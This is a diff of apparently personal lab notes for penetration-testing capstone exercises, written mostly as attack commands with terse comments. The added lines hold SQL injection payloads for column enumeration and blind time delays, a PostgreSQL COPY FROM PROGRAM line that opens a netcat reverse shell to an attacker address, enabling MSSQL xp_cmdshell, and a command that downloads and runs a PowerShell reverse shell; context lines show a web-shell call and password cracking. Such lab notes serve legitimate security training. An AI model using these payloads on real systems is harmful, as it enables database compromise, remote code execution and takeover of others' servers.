@@ -146,7 +146,7 @@ wpscan --url http://alvida-eatery.org
 sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
 # Find flag.txt on linux system
-find /* -iname "flag.txt" 2> /dev/null         
+find /* -iname "*.txt" 2>/dev/null
 ```
 
 - Capstone 2
@@ -190,5 +190,47 @@ curl http://192.168.237.48/webshell.php?cmd=cat%20../flag.txt
 
 - Capstone 3
 ```
+# Explore webpage and test all POST request variables
+';concat('a','b')-- //
 
+# height variable has sql injection. We get an error message
+
+# next determine number of columns
+'order by 7; -- 
+# success with 6 means 6 columns
+'order by 6; -- 
+
+# start testing each column 
+# try version(), current_database(), user
+# check types of columns by casting 
+# Error messages can be used for enumeration
+
+'union select null, cast(version() as int), null, null, null, null --
+
+# Getting code execution 
+';DROP TABLE IF EXISTS commandexec; CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/sh 192.168.45.227 443';--
 ```
+
+- Capstone 4
+```
+# Enumerate webpage and find login
+# test username and password for sql injection
+'concat('a','b');--
+
+# recieved error. We know it MSsql. Try to check version and user 
+# we can try using error messages for incorrect syntax but get nothing with correct syntax
+# check for time delay (blindsqli)
+'waitfor delay '00:00:10'--
+
+# hmm this works...
+# lets try to enable xp_cmdshell
+# one liner to enable xp_cmdshell
+EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+# Download and run powershell reverse shell script
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.227:80/rev.ps1") | powershell -noprofile'
+
+# search for flag with powershell
+Get-ChildItem -Path C:\ -Include flag.txt -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {Get-Content $_.FullName} 2>$null
+```
+
